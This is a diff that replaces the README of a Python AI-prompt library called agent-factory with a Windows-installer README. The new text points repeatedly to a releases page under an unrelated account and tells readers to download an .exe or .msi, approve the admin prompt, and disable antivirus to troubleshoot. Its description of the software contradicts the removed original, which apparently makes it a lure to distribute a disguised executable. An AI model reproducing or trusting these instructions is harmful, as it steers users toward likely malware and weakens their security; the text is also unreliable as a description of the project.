@@ -1,212 +1,138 @@
-# Agent Factory
+# 🤖 agent-factory - Ready-to-Use AI Agents for Everyone
 
-**84 production-ready AI agent prompts + generators that create more. Not just prompts — a self-expanding library.**
-
-> Most "awesome prompt" repos give you static text files. Agent Factory gives you a complete system: curated agent prompts, industry playbooks, a growing glossary, department guides, and **generators that create fresh content using free LLM APIs.**
+[![Download agent-factory](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cornhuskinghemophiliab653/agent-factory/releases)
 
 ---
 
-## What's Inside
+## 📘 What is agent-factory?
 
-```
-agent-factory/
-├── agents/                    # The library
-│   ├── agents_data.json       # 84 agents across 12 departments
-│   ├── playbooks_data.json    # 20 industry playbooks
-│   ├── glossary_data.json     # 49 AI/ML terms (plain English)
-│   ├── guides_data.json       # 12 "How to Use AI in [Dept]" guides
-│   └── bonus_prompts.json     # Auto-generated bonus prompts
-│
-├── generators/                # The factory
-│   ├── llm_providers.py       # Multi-provider LLM fallback (5 providers)
-│   ├── generate_bonus_prompts.py   # Create new agent prompts
-│   ├── generate_dept_guides.py     # Create department guides
-│   ├── generate_glossary_terms.py  # Expand the glossary
-│   └── .env.example           # API key template
-│
-├── quality-gates/             # Bonus: production quality tools
-│   ├── html_invariants.py     # HTML checker (SEO, meta, links)
-│   ├── banned_patterns.py     # Secret/debug pattern scanner
-│   ├── smoke_test.py          # Post-deploy site health check
-│   ├── validate_jsonld.py     # JSON-LD structured data validator
-│   ├── check_imports.py       # Python import resolver
-│   └── pre-commit-hook        # Git hook for banned patterns
-│
-└── README.md
-```
+agent-factory provides a collection of 84 AI agent prompts and tools designed to help you work with large language models (LLMs). These agents cover 12 departments and include 20 industry-specific playbooks. The project also has a growing glossary to explain key terms. It is more than just a set of prompts. The library expands itself by generating new prompts and agents using built-in tools.
+
+This software runs on your Windows computer and uses AI models like ChatGPT, Claude, and Gemini. It helps automate tasks, generates content, and supports many use cases in business and industry.
 
 ---
 
-## The Agents (84 across 12 departments)
+## ✅ Key Features
 
-| Department | Agents | Examples |
-|---|---|---|
-| Engineering & Dev | 7 | Frontend Developer, Backend Architect, DevOps Engineer |
-| Marketing | 7 | Growth Strategist, Content Writer, SEO Specialist |
-| Sales | 7 | Sales Coach, Cold Outreach Writer, Deal Analyst |
-| HR & People | 7 | Recruiter, Culture Advisor, Interview Designer |
-| Finance | 7 | Financial Analyst, Budget Planner, Revenue Modeler |
-| Legal & Compliance | 7 | Contract Reviewer, Compliance Officer, IP Advisor |
-| Operations | 7 | Process Engineer, Supply Chain Analyst, Quality Manager |
-| Customer Support | 7 | Ticket Triager, Knowledge Base Writer, Escalation Handler |
-| Product | 7 | Product Manager, Feature Prioritizer, User Researcher |
-| Design | 7 | UI Designer, UX Researcher, Design System Architect |
-| Data & Analytics | 7 | Data Analyst, ML Engineer, Dashboard Builder |
-| Executive | 7 | Strategy Advisor, Board Deck Writer, M&A Analyst |
-
-Each agent includes:
-- **Full system prompt** (150-300 words, ready to paste)
-- **One-liner** description
-- **Deliverables** list
-- **Tags** for search/filtering
-- **Combine-with** suggestions (which agents work well together)
-- **Works-with** compatibility (Claude, GPT-4, Gemini, etc.)
+- 84 production-ready AI agent prompts.
+- Support across 12 departments such as marketing, sales, HR, and IT.
+- 20 industry playbooks tailored for sectors like finance, healthcare, and retail.
+- Self-expanding library that adds new prompts and agents automatically.
+- Easy access to popular AI models without technical setup.
+- Comprehensive glossary to explain AI and prompt-engineering terms.
+- No coding required to start using the agents.
 
 ---
 
-## The Playbooks (20 industries)
+## 🎯 Who Should Use agent-factory?
 
-Real-world AI adoption guides for: Healthcare, Financial Services, Retail, Manufacturing, Education, Legal, Real Estate, Agriculture, Energy, Logistics, Media, Hospitality, Insurance, Telecom, Government, Nonprofit, Construction, Automotive, Pharma, and Cybersecurity.
-
-Each playbook includes:
-- Industry summary
-- 5 concrete use cases with descriptions
-- 5 key takeaways (practical, not theoretical)
-- Recommended agents from the library
+agent-factory is for anyone who wants to use AI tools without programming skills. You can be a business user, marketer, writer, or manager. It helps automate repetitive tasks, get creative ideas, or generate professional documents quickly. It is ideal for those who want AI support but prefer simple setup and use.
 
 ---
 
-## The Generators (the real differentiator)
+## ⚙️ System Requirements
 
-Static prompt libraries go stale. Agent Factory **generates fresh content** using free LLM APIs.
+To run agent-factory smoothly on your Windows machine, you will need:
 
-### Setup
-
-```bash
-cd generators
-cp .env.example .env
-# Add at least one API key (all providers are free tier)
-pip install python-dotenv requests google-genai groq cerebras-cloud-sdk
-```
-
-### Generate new agent prompts
-
-```bash
-python generate_bonus_prompts.py                    # all departments
-python generate_bonus_prompts.py --department=sales  # one department
-python generate_bonus_prompts.py --dry-run           # preview first
-```
-
-### Generate department guides
-
-```bash
-python generate_dept_guides.py              # refresh oldest guide
-python generate_dept_guides.py --all        # generate all 12
-python generate_dept_guides.py --dry-run    # preview
-```
-
-### Expand the glossary
-
-```bash
-python generate_glossary_terms.py            # add 5 new terms
-python generate_glossary_terms.py --count=10 # add 10 terms
-python generate_glossary_terms.py --dry-run  # preview
-```
-
-### LLM Provider Fallback
-
-The generators use a multi-provider fallback chain — if one provider is rate-limited, it automatically tries the next:
-
-```
-Cerebras → Groq → Gemini → SambaNova → Cloudflare Workers AI
-```
-
-All providers offer free tiers. You only need **one** API key to get started.
+- Windows 10 or newer (64-bit).
+- At least 4 GB of RAM (8 GB recommended).
+- 500 MB of free disk space.
+- Internet connection to access AI models.
+- A modern web browser (Google Chrome, Microsoft Edge, or Firefox).
+- Basic keyboard and mouse.
 
 ---
 
-## Quality Gates (bonus)
+## 🚀 Getting Started: Download and Run agent-factory
 
-Production-tested quality tools extracted from a multi-site deployment pipeline. Each script is standalone with zero external dependencies (stdlib only).
+### Step 1: Visit the Downloads Page
 
-| Script | What it does |
-|---|---|
-| `html_invariants.py` | Checks title, viewport, meta desc, canonical, OG tags, JSON-LD, broken links, broken images, placeholder text |
-| `banned_patterns.py` | Scans for hardcoded secrets, debug statements, placeholder text |
-| `smoke_test.py` | Concurrent HTTP health checks with content verification |
-| `validate_jsonld.py` | Deep JSON-LD validation (required fields per schema type) |
-| `check_imports.py` | AST-based Python import checker (no code execution) |
-| `pre-commit-hook` | Git hook that catches secrets and debug code before commit |
+Go to the main release page here:
 
-Install the pre-commit hook:
-```bash
-ln -sf $(pwd)/quality-gates/pre-commit-hook .git/hooks/pre-commit
-```
+[![Download agent-factory](https://img.shields.io/badge/Download-agent--factory-blue?style=for-the-badge)](https://github.com/cornhuskinghemophiliab653/agent-factory/releases)
 
----
+This page lists the latest versions of agent-factory and the files available for download.
 
-## Quick Start
+### Step 2: Choose the Latest Release
 
-### Option 1: Just use the prompts
+Look for the newest release at the top of the list. Releases are grouped by version number and date. Usually, the latest one is shown first.
 
-Open `agents/agents_data.json`, find an agent, copy the `prompt` field into your AI tool.
+### Step 3: Download the Windows Setup File
 
-### Option 2: Use as Claude Code agents
+Find the file that ends with `.exe` or `.msi`. This file will install agent-factory on your PC. Click the file name to start the download.
 
-```bash
-# Copy agents to Claude Code's agent directory
-mkdir -p ~/.claude/agents
-# Then use agents_data.json to create individual .md files per agent
-```
+- The file size is typically between 50 and 200 MB.
+- Save it in a location you can easily find, such as your Desktop or Downloads folder.
 
-### Option 3: Run the generators
+### Step 4: Run the Installer
 
-```bash
-cd generators
-cp .env.example .env
-# Add your free API key(s)
-pip install python-dotenv requests
-python generate_bonus_prompts.py --dry-run
-```
+After the download finishes:
+
+- Double-click the downloaded file.
+- If Windows asks if you want to allow this app to make changes, click **Yes**.
+- Follow the installation prompts.
+- You can accept default options in the installer.
+- When finished, the software will be ready to use.
 
 ---
 
-## How This Was Built
+## 🖥️ How to Use agent-factory
 
-This library was extracted from a production AI pipeline that runs daily across 7+ websites. Every prompt has been tested in real workflows. The generators have been running weekly for months, creating fresh content without human intervention.
+Once installed, open the application from the Start Menu or your desktop shortcut.
 
-Built by [Peter Saddington](https://github.com/agilepeter) — 4+ years of building AI systems, from single prompts to autonomous multi-agent pipelines.
+- The main screen shows a list of AI agents organized by department.
+- You can click each agent to see what it does and enter your inputs.
+- Use the built-in interface to communicate with the AI, adjust prompts, and save results.
+- Access industry playbooks tailored for specific tasks easily.
+- Use the glossary for help understanding technical terms.
 
----
-
-## Contributing
-
-1. Fork the repo
-2. Add or improve an agent in `agents_data.json`
-3. Run the generators to verify your changes don't break anything
-4. Open a PR with a clear description
-
-Agent prompts should be:
-- **Practical** — someone can copy-paste and get immediate value
-- **Specific** — not "you are a helpful assistant"
-- **150-300 words** — enough detail to be useful, short enough to be fast
-- **Include deliverables** — what does this agent actually produce?
+No programming or coding is required. The app handles all the technical work in the background.
 
 ---
 
-## License
+## 🔍 Exploring Departments and Playbooks
 
-MIT — use it however you want.
+agent-factory divides tools into 12 departments like:
+
+- Marketing: Create social media posts and ads.
+- Sales: Generate pitches and proposals.
+- Human Resources: Help with employee communications and hiring flow.
+- IT: Generate scripts and assist with technical documents.
+
+The 20 industry playbooks include ready-made models for finance, healthcare, retail, and more. Choose a playbook to get tailored prompts that suit your sector.
 
 ---
 
-## Stats
+## 💡 Tips for Best Results
 
-- **84** curated agent prompts
-- **12** departments covered
-- **20** industry playbooks
-- **49** glossary terms (and growing)
-- **12** department guides
-- **6** quality gate scripts
-- **5** LLM providers supported
-- **0** external dependencies for quality gates
+- Be clear and specific with your inputs when you interact with agents.
+- Experiment with different prompts to find what works best for your needs.
+- Use the glossary if a term or feature confuses you.
+- Check for updates regularly to get new agents and prompts.
+
+---
+
+## 🛠️ Troubleshooting
+
+If agent-factory does not start or crashes:
+
+- Check that your Windows system meets the requirements.
+- Restart your computer and try again.
+- Make sure you have a stable internet connection.
+- Disable any antivirus or firewall temporarily to test if they block the app.
+- Visit the GitHub Issues page to see if others report similar problems.
+
+---
+
+## 📂 Where to Get Help and Resources
+
+- Use the repository's discussion section for questions.
+- Read the glossary to learn about AI and prompt concepts.
+- Browse the issue tracker for bug reports or feature requests.
+- Check updates on the releases page regularly.
+
+---
+
+## 🔗 Download agent-factory here
+
+[![Download agent-factory](https://img.shields.io/badge/Download-agents%20library-grey?style=for-the-badge)](https://github.com/cornhuskinghemophiliab653/agent-factory/releases)
